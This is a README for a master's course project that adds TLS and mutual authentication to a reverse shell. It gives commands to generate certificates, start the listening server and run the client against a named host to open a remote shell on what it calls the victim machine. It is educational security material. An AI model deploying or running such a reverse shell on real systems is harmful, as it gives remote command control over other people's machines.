# Wireless Systems Security final project

*Authors: Pau de las Heras and Eric Roy*

*This is the final project of the Wireless Systems Security course from
the ML and Cybersecurity for Internet-Connected Systems MSc at EPSEM-UPC*

> **DISCLAIMER:** this code is published under the MIT license and only for
educational purposes. We are not responsible for any unethical usage of these
scripts.

---

## Outline

We enhance an existing [reverse shell application](https://github.com/frezazadeh/Security-Course-Labs/tree/main/Lab1-Reverse-shell)
by integrating critical security measures like TLS encryption and both server and client-side authentication.

## Features

- This is a reverse shell that works over TLS:
  - The server is authenticated by the client using a self-signed certificate (known and trusted by the client).
  - The client is authenticated by the server using a pre-shared key (PSK).
- This educative project has some limitations in scope:
  - This server can only listen to a single-client at a time. However, it can manage multiple connection sessions one after the other.
  - The server script is meant to run on a no-GUI server, and therefore only offers command line interaction via standard input and output (which in a real setting would be dumped to a log file, probably)
- Both the client and server script are fully customizable via command line arguments.
- All scripts have proper logging that can be adjusted via the centralized logging manager at `logger.py`. Again, in a realistic setting, this centralized logger could be easily adjusted to dump log messages into a DB for tracing purposes.

## Usage

Install the requirements using:

```
pip install -r requirements.txt
```

### Server-side

First, create a self-signed certificate on the server
(the machine that issues commands to the victim/client).

Assuming a Linux server, you can do so by running the following command: 
```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

This will generate a pair of files, one with the private key of the certificate (`key.pem`)
and another one with the public information (`cert.pem`).
The latter should be copied to the client machine
in order to authenticate the server (more on that in the following section).

You can run the server to listen for incoming connections with:
```
python3 server.py
```

This uses the default configuration, which can be adapted as needed via command line arguments, e.g.:
```
python3 server.py --port 5555 --private-key-path /home/user/key.pem --password 123456789
```

For more information on the available parameters use `-h` or `--help`:
```
python3 server.py --help
```

### Client-side

On the client machine, copy the `client.py` and `logger.py` files and the `cert.pem` file previously generated
(you can do so by copying it through SSH with `scp` or by any other means).
**DO NOT** copy the `key.pem` file, since that would defeat the purpose of public-key authentication
due to the client knowing the server's secrets.

You can run the client to connect to the server
and open a reverse shell that accepts incoming commands with:
```
python3 client.py
```

This uses the default configuration, which can be adapted as needed via command line arguments, e.g.:
```
python3 client.py --host asi.ericroy.net --port 5555 --password 123456789 --public-key-path /home/user/cert.pem
```

For more information on the available parameters use `-h` or `--help`:
```
python3 client.py --help
```
